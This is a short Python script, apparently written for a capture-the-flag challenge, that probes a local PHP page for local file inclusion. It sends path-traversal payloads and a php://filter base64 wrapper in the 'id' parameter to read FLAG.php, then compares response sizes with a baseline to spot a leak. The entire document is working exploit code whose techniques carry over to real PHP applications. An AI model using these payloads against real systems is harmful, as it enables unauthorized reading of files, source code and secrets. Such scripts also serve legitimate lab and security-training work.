import requests
from requests.adapters import HTTPAdapter

# Create session with limited connection pool
session = requests.Session()
adapter = HTTPAdapter(pool_connections=1, pool_maxsize=1, max_retries=0)
session.mount('http://', adapter)

url = "http://127.0.0.1:32904/post.php"

print("Testing LFI for FLAG.php with session management...")

test_payloads = [
    "../FLAG.php",
    "../../FLAG.php", 
    "php://filter/convert.base64-encode/resource=../FLAG.php"
]

for payload in test_payloads:
    print(f"\n{'='*60}")
    print(f"Payload: {payload}")
    print('='*60)
    
    try:
        resp = session.get(
            url, 
            params={'id': payload},
            headers={'Connection': 'close'},
            timeout=8
        )
        
        length = len(resp.content)
        print(f"Status: {resp.status_code} | Length: {length} bytes")
        
        if length != 5326:
            print(f"✓ ANOMALY DETECTED (baseline is 5326 bytes)")
            print(f"\nResponse content:\n{resp.text}")
            
            if b'FLAG{' in resp.content:
                print("\n🚩🚩🚩 FLAG FOUND! 🚩🚩🚩")
        else:
            print("✗ Same as baseline (likely blocked)")
            
    except Exception as e:
        print(f"Error: {e}")

session.close()
print("\n" + "="*60)
print("Testing complete")

